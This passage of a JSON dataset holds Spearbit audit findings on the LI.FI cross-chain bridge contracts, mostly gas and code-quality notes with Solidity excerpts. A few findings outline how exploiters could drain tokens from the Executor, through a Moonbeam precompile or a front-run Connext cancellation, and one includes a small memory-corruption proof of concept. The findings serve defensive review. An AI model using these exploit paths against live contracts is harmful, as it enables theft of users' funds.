        "body": "It might be cheaper to call getTokenFromPoolId in a constructor and store in immutable variables (especially because there are not that many pool, currently max 3 per chain pool-ids ) On the other hand, It requires an update of the facet when new pools are added though. function getTokenFromPoolId(address _router, uint256 _poolId) private view returns (address) { address factory = IStargateRouter(_router).factory(); address pool = IFactory(factory).getPool(_poolId); return IPool(pool).token(); } For the srcPoolId it would be possible to replace this with a token address in the calling interface and lookup the poolid. However, for dstPoolId this would be more difficult, unless you restrict it to the case where srcPoolId == dstPoolId e.g. the same asset is received on the destination chain. This seems a logical restriction. The advantage of not having to specify the poolids is that you abstract the interface from the caller and make the function calls more similar.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use block.chainid for chain ID verification in HopFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "HopFacet.sol uses user provided _hopData.fromChainId to identify current chain ID. Call to Hop Bridge will revert if it does not match block.chain, so this is still secure. However, as a gas optimization, this parameter can be removed from HopData struct, and its usage can be replaced by block.chainid.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rename event InvalidAmount(uint256) to ZeroAmount()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "event InvalidAmount(uint256) is emitted only with an argument of 0: if (_amount <= 0) { revert InvalidAmount(_amount); } ... if (msg.value <= 0) { revert InvalidAmount(msg.value); } Since amount and msg.value can only be non-negative, these if conditions succeed only when these values are 0. Hence, only InvalidAmount(0) is ever emitted.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use custom errors instead of strings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization LibDiamond.sol#L56,"
        ]
    },
    {
        "title": "Use calldata over memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. If the array is passed to an internal function which passes the array to another internal function where the array is modified and therefore memory is used in the external call, its still more gass-efficient to use calldata when the external function uses modifiers, since the modifiers may prevent the internal functions from being called. Some gas savings if function arguments are passed as calldata instead of memory.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid reading from storage when possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Functions, which can only be called by the contracts owner, can use msg.sender to read owners In all these cases below, ownership check is already done, so it is address after the ownership check is done. guaranteed that owner == msg.sender. LibAsset.transferAsset(tokenAddress, payable(owner), balance); ... LibAsset.transferAsset(tokenAddresses[i], payable(owner), balance); ... if (_newOwner == owner) revert NewOwnerMustNotBeSelf(); owner is a state variable, so reading it has significant gas costs. This can be avoided here by using msg.sender instead.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Increment for loop variable in an unchecked block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "(This is only relevant if you are using the default solidity checked arithmetic). i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Executor should consider pre-deployed contract behaviors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Executor contract allows users to do arbitrary calls. This allows users to trigger pre-deployed contracts (which are used on specific chains). Since the behaviors of pre-deployed contracts differ, dapps on different evm compatible chain would have different security assumption. Please refer to the Avax bug fix. Native-asset-call-deprecation Were the native asset call not deprecated, exploiters can bypass the check and triggers ERC20Proxy through the pre-deployed contract. Since the Avalanche team has deprecated the dangerous pre-deployed, the current Executor contract is not vulnerable. Moonbeams pre-deployed contract also has strange behaviors. Precompiles erc20 allows users transfer native token through ERC20 interface. Users can steal native tokens on the Executor by setting callTo = address(802) and calldata = transfer(receiver, amount) One of the standard ethereum mainnet precompiles is \"Identity\" (0x4), which copies memory. Depending on the use of memory variables of the function that does the callTo, it can corrupt memory. Here is a POC: 47 pragma solidity ^0.8.17; import \"hardhat/console.sol\"; contract Identity { function CorruptMem() public { uint dest = 128; uint data = dest + 1 ; uint len = 4; assembly { if iszero(call(gas(), 0x04, 0, add(data, 0x20), len, add(dest,0x20), len)) { invalid() } } } constructor() { string memory a = \"Test!\"; CorruptMem(); console.log(string(a)); // --> est!! } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Documentation improvements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are a few issues in the documentation:  HyphenFacets documentation describes a function no longer present.  Link to DexManagerFacet in README.md is incorrect.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check quoteTimestamp is within ten minutes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "quoteTimestamp is not validated. According to Across, quoteTimestamp variable, at which the depositor will be quoted for L1 liquidity. This enables the depositor to know the L1 fees before submitting their deposit. Must be within 10 mins of the current time. function _startBridge(AcrossData memory _acrossData) internal { bool isNative = _acrossData.token == ZERO_ADDRESS; if (isNative) _acrossData.token = _acrossData.weth; else LibAsset.maxApproveERC20(IERC20(_acrossData.token), _acrossData.spokePool, ,! _acrossData.amount); IAcrossSpokePool pool = IAcrossSpokePool(_acrossData.spokePool); pool.deposit{ value: isNative ? _acrossData.amount : 0 }( _acrossData.recipient, _acrossData.token, _acrossData.amount, _acrossData.destinationChainId, _acrossData.relayerFeePct, _acrossData.quoteTimestamp ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Integrate two versions of depositAsset()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function depositAsset(, , isNative ) doesnt check tokenId == NATIVE_ASSETID, although depositAsset(,) does. In the code base depositAsset(, , isNative ) isnt used. function depositAsset( address tokenId, uint256 amount, bool isNative ) internal { if (amount == 0) revert InvalidAmount(); if (isNative) { ... } else { ... } } function depositAsset(address tokenId, uint256 amount) internal { return depositAsset(tokenId, amount, tokenId == NATIVE_ASSETID); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify batchRemoveDex()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The code of batchRemoveDex() is somewhat difficult to understand and thus to maintain. function batchRemoveDex(address[] calldata _dexs) external { ... uint256 jlength = storageDexes.length; for (uint256 i = 0; i < ilength; i++) { ... for (uint256 j = 0; j < jlength; j++) { if (storageDexes[j] == _dexs[i]) { ... // update storageDexes.length; jlength = storageDexes.length; break; } } } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Error handing in executeCallAndWithdraw",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "If isContract happens to be false then success is false (as it is initialized as false and not updated) Thus the _withdrawAsset() will never happen. Function withdraw() also exist so this functionality isnt necessary but its more logical to revert earlier. 50 function executeCallAndWithdraw(...) ... { ... bool success; bool isContract = LibAsset.isContract(_callTo); if (isContract) { false // thus is false ,! (success, ) = _callTo.call(_callData); } if (success) { // if this is false, then success stays _withdrawAsset(_assetAddress, _to, _amount); // this never happens if isContract == false } else { revert WithdrawFailed(); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "_withdrawAsset() could use LibAsset.transferAsset()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "A large part of the function _withdrawAsset() is very similar to LibAsset.transferAsset(). function _withdrawAsset(...) ... { ... if (_assetAddress == NATIVE_ASSET) { address self = address(this); if (_amount > self.balance) revert NotEnoughBalance(_amount, self.balance); (bool success, ) = payable(sendTo).call{ value: _amount }(\"\"); if (!success) revert WithdrawFailed(); } else { assetBalance = IERC20(_assetAddress).balanceOf(address(this)); if (_amount > assetBalance) revert NotEnoughBalance(_amount, assetBalance); SafeERC20.safeTransfer(IERC20(_assetAddress), sendTo, _amount); } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "anySwapOut() doesnt lower allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function anySwapOut() only seems to work with Anyswap tokens. It burns the received to- kens here: AnyswapV5Router.sol#L334 This burning doesnt use/lower the allowance, so the allowance will stay present. Also see howto: function anySwapOut ==> no need to approve. function _startBridge(...) ... { ... LibAsset.maxApproveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount); ... IAnyswapRouter(_anyswapData.router).anySwapOut(...); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Anyswap rebrand",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Anyswap is rebranded to Multichain see rebrand.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check processing of native tokens in AnyswapFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The variable isNative seems to mean a wrapped native token is used (see function _getUnderly- ingToken() ). Currently startBridgeTokensViaAnyswap() skips LibAsset.depositAsset() when isNative == true, but a wrapped native tokens should also be moved via LibAsset.depositAsset(). Also _startBridge() tries to send native tokens with { value: _anyswapData.amount } then isNative == true, but this wouldnt work with wrapped tokens. The Howto seems to indicate an approval (of the wrapped native token) is neccesary. 52 contract AnyswapFacet is ILiFi, SwapperV2, ReentrancyGuard { ,! ,! function startBridgeTokensViaAnyswap(LiFiData calldata _lifiData, AnyswapData calldata _anyswapData) ... { { // Multichain (formerly Anyswap) tokens can wrap other tokens (address underlyingToken, bool isNative) = _getUnderlyingToken(_anyswapData.token, _anyswapData.router); if (!isNative) LibAsset.depositAsset(underlyingToken, _anyswapData.amount); ... } function _getUnderlyingToken(address token, address router) ... { ... if (token == address(0)) revert TokenAddressIsZero(); underlyingToken = IAnyswapToken(token).underlying(); // The native token does not use the standard null address ID isNative = IAnyswapRouter(router).wNATIVE() == underlyingToken; // Some Multichain complying tokens may wrap nothing if (!isNative && underlyingToken == address(0)) { underlyingToken = token; } } function _startBridge(... ) ... { ... if (isNative) { IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(...); // ,! send native tokens } ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove payable in swapAndCompleteBridgeTokensViaStargate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant The function swapAndCompleteBridgeTokensViaStargate of Executor is payable but doesnt receive native to- kens. 53 contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { // not payable ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); // ,! doesn't send native assets ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { // is payable if (msg.sender != address(this)) { revert InvalidCaller(); } } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the same order for inherited contracts.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The inheritance of contract isnt always done in the same order. For code consistency its best to always put them in the same order. contract AmarokFacet contract AnyswapFacet contract ArbitrumBridgeFacet contract CBridgeFacet contract GenericSwapFacet contract GnosisBridgeFacet contract HopFacet contract HyphenFacet contract NXTPFacet contract OmniBridgeFacet contract OptimismBridgeFacet contract PolygonBridgeFacet contract StargateFacet contract GenericBridgeFacet contract WormholeFacet contract AcrossFacet contract Executor is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, ReentrancyGuard { is ILiFi, ReentrancyGuard, Swapper { is ILiFi, ReentrancyGuard, SwapperV2 { is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi {",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Catch potential revert in swapAndStartBridgeTokensViaStargate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The following statement nativeFee -= _swapData[i].fromAmount; can revert in the swapAnd- StartBridgeTokensViaStargate(). function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { if (LibAsset.isNativeAsset(_swapData[i].sendingAssetId)) { nativeFee -= _swapData[i].fromAmount; // can revert } } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "No need to use library If It is in the same file",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the LibAsset, some of the functions are called through LibAsset., however there is no need to call because the functions are in the same solidity file. ... ... if (msg.value != 0) revert NativeValueWithERC(); uint256 _fromTokenBalance = LibAsset.getOwnBalance(tokenId); LibAsset.transferFromERC20(tokenId, msg.sender, address(this), amount); if (LibAsset.getOwnBalance(tokenId) - _fromTokenBalance != amount) revert InvalidAmount();",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Combined Optimism and Synthetix bridge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The Optimism bridge also includes a specific bridge for Synthetix tokens. Perhaps it is more clear to have a seperate Facet for this. function _startBridge(...) ... { ... if (_bridgeData.isSynthetix) { bridge.depositTo(_bridgeData.receiver, _amount); } else { ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck the Diamond pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The LiFi protocol uses the diamond pattern. This pattern is relative complex and has overhead for the delegatecall. There is not much synergy between the different bridges (except for access controls & white lists). By combining all the bridges in one contract, the risk of one bridge might have an influence on another bridge.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reference Diamond standard",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The LiFiDiamond.sol contract doesnt contain a reference to the Diamond contract. Having that would make it easier for readers of the code to find the origin of the contract.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Validate Nxtp InvariantTransactionData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been noticed that InvariantTransactionDatas fields are not validated. Even if the validation located in the router, sendingChainFallback and receivingAddress parameters are sensible and connext does not have meaningful error message on these parameter validation. Also, router parameter does not have any validation. Most of the other facets have. For instance : Amarok Facet Note: also see issue \"Hardcode bridge addresses via immutable\" function _startBridge(NXTPData memory _nxtpData) private returns (bytes32) { ITransactionManager txManager = ITransactionManager(_nxtpData.nxtpTxManager); IERC20 sendingAssetId = IERC20(_nxtpData.invariantData.sendingAssetId); // Give Connext approval to bridge tokens LibAsset.maxApproveERC20(IERC20(sendingAssetId), _nxtpData.nxtpTxManager, _nxtpData.amount); uint256 value = LibAsset.isNativeAsset(address(sendingAssetId)) ? _nxtpData.amount : 0; // Initiate bridge transaction on sending chain ITransactionManager.TransactionData memory result = txManager.prepare{ value: value }( ITransactionManager.PrepareArgs( _nxtpData.invariantData, _nxtpData.amount, _nxtpData.expiry, _nxtpData.encryptedCallData, _nxtpData.encodedBid, _nxtpData.bidSignature, _nxtpData.encodedMeta ) ); return result.transactionId; }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Executor contract should not handle cross-chain swap from Connext",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The Executor contract is designed to handle a swap at the destination chain. The LIFI protocol may build a cross-chain transaction to call Executor.swapAndCompleteBridgeTokens at the destination chain. In order to do a flexible swap, the Executor can perform arbitrary execution. Executor.sol#L323-L333 57 function _executeSwaps( LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData, address payable _receiver ) private noLeftovers(_swapData, _receiver) { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } However, the receiver address is a privileged address in some bridging services. Allowing users to do arbitrary execution/ external calls is dangerous. The Connext protocol is an example : Connext contractAPI#cancel The receiver address can prematurely cancel a cross-chain transaction. When a cross-chain execution is canceled, the funds would be sent to the fallback address without executing the external call. Exploiters can front-run a gelato relayer and cancel a cross-chain execution. The (post-swap) tokens will be sent to the receivers address. The exploiters can grab the tokens left in the Executor in the same transaction.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid using strings in the interface of the Axelar Facet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The Axelar Facet uses strings to indicate the destinationChain, destinationAddress, which is different then on other bridge facets. function executeCallWithTokenViaAxelar( string memory destinationChain, string memory destinationAddress, string memory symbol, ... ) ...{ } The contract address is (or at least can be) encoded as a hex string, as seen in this example: /// https://etherscan.io/tx/0x7477d550f0948b0933cf443e9c972005f142dfc5ef720c3a3324cefdc40ecfa2 # 0 1 2 3 4 Type Name destinationChain string destinationContractAddress payload symbol amount bytes string uint256 50000000 0xA57ADCE1d2fE72949E4308867D894CD7E7DE0ef2 Data binance string USDC 58 The Axelar bridge allows bridging to non EVM chains, however the LiFi protocol doesnt seem to support thus. So its good to prevent accidentally sending to non EVM chains. Here are the supported non EVM chains: non-evm- networks The Axelar interface doesnt have a (compatible) emit.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Hardcode source Nomad domain ID via immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "AmarokFacet takes source domain ID as a user parameter and passes it to the bridge: originDomain: _bridgeData.srcChainDomain User provided can be incorrect, and Connext will later revert the transaction. See BridgeFacet.sol#L319-L321: if (_args.params.originDomain != s.domain) { revert BridgeFacet__xcall_wrongDomain(); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Amount swapped not emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The emits LiFiTransferStarted() and LiFiTransferCompleted() dont emit the amount after the swap (e.g. the real amount that is being bridged / transferred to the receiver). This might be useful to add. 59 event LiFiTransferStarted( bytes32 indexed transactionId, string bridge, string bridgeData, string integrator, address referrer, address sendingAssetId, address receivingAssetId, address receiver, uint256 amount, uint256 destinationChainId, bool hasSourceSwap, bool hasDestinationCall ); event LiFiTransferCompleted( bytes32 indexed transactionId, address receivingAssetId, address receiver, uint256 amount, uint256 timestamp );",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment is not compatible with code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the HyphenFacet, Comment is mentioned that approval is given to Anyswap. But, approval is given to Hyphen router. function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); if (_hyphenData.token != address(0)) { // Give Anyswap approval to bridge tokens LibAsset.maxApproveERC20(IERC20(_hyphenData.token), _hyphenData.router, _hyphenData.amount); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move whitelist to LibSwap.swap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function LibSwap.swap() is dangerous because it can call any function of any contract. If this is exposed to the outside (like in GenericBridgeFacet), is might enable access to transferFrom() and thus stealing tokens. Also see issue \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" Luckily most of the time LibSwap.swap() is called via _executeSwaps(), which has a whitelist and reduces the risk. To improve security it would be better to integrate the whitelists in LibSwap.swap(). Note: also see issue \"_executeSwaps of Executor.sol doesnt have a whitelist\" library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { if (!LibAsset.isContract(_swapData.callTo)) revert InvalidContract(); ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } } contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant check on the HyphenFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the HyphenFacet, there is a condition which checks source chain is different than destination chain id. However, the conditional check is already placed on the Hyphen contracts. _depositErc20, _depositNative) function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check input amount equals swapped amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The bridge functions dont check that input amount ( _bridgeData.amount or msg.value) is equal to the swapped amount (_swapData[0].fromAmount). This could lead to funds remaining in the LiFi Diamond or Executor. Luckily noLeftovers() or checks on startingBalance solve this by sending the remaining balance to the origina- tor or receiver. However this is fixing symptoms instead of preventing the issue. function swapAndStartBridgeTokensViaOmniBridge( ... LibSwap.SwapData[] calldata _swapData, BridgeData calldata _bridgeData ) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use same layout for facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The different bridge facets use different layouts for the source code. This can be seen at the call to _startBridge(). The code is easier to maintain If it is the same everywhere. 62 AmarokFacet.sol: ArbitrumBridgeFacet.sol: OmniBridgeFacet.sol: OptimismBridgeFacet.sol: PolygonBridgeFacet.sol: StargateFacet.sol: AcrossFacet.sol: CBridgeFacet.sol: GenericBridgeFacet.sol: GnosisBridgeFacet.sol: HopFacet.sol: HyphenFacet.sol: NXTPFacet.sol: AnyswapFacet.sol: WormholeFacet.sol: AxelarFacet.sol: _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, true); _startBridge(_stargateData, _lifiData, nativeFee, true); _startBridge(_acrossData); _startBridge(_cBridgeData); _startBridge(_bridgeData); _startBridge(gnosisBridgeData); _startBridge(_hopData); _startBridge(_hyphenData); _startBridge(_nxtpData); _startBridge(_anyswapData, underlyingToken, isNative); _startBridge(_wormholeData); // no _startBridge",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Safety check is missing on the remaining amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the FeeCollector contract, There is no safety check to ensure remaining amount doesnt under- flow and revert. function collectNativeFees( uint256 integratorFee, uint256 lifiFee, address integratorAddress ) external payable { ... ... } uint256 remaining = msg.value - (integratorFee + lifiFee);",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Entire struct can be emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The emit LiFiTransferStarted() generally outputs the entire struct _lifiData by specifying all Its also possible to emit the entire struct in one go. This would make the code smaller and fields of the struct. easier to maintain. function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant return value from internal function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Callers of NXTPFacet._startBridge() function never use its return value.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Change comment on the LibAsset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The following comment is used in the LibAsset.sol contract. However, Connext doesnt have this file anymore and deleted with the following commit. /// @title LibAsset /// @author Connext <support@connext.network> /// @notice This library contains helpers for dealing with onchain transfers /// /// library LibAsset {} of assets, including accounting for the native asset `assetId` conventions and any noncompliant ERC20 transfers",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Integrate all variants of _executeAndCheckSwaps()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are multiple functions that are more or less the same:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet As these are important functions it is worth the trouble to have one code base to maintain. For example swapAnd- CompleteBridgeTokens() doesnt check msg.value ==0 when ERC20 tokens are send. Note: swapAndCompleteBridgeTokensViaStargate() of StargateFacet.sol already uses SwapperV2.sol",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Utilize NATIVE_ASSETID constant from LibAsset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the codebase, LibAsset library contains the variable which defines zero address. However, on the facets the check is repeated. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs. contract AcrossFacet { address internal constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000; } contract DexManagerFacet { if (_dex == 0x0000000000000000000000000000000000000000) } contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; ... } address sendTo = (_to == address(0)) ? msg.sender : _to;",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Native matic will be treated as ERC20 token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
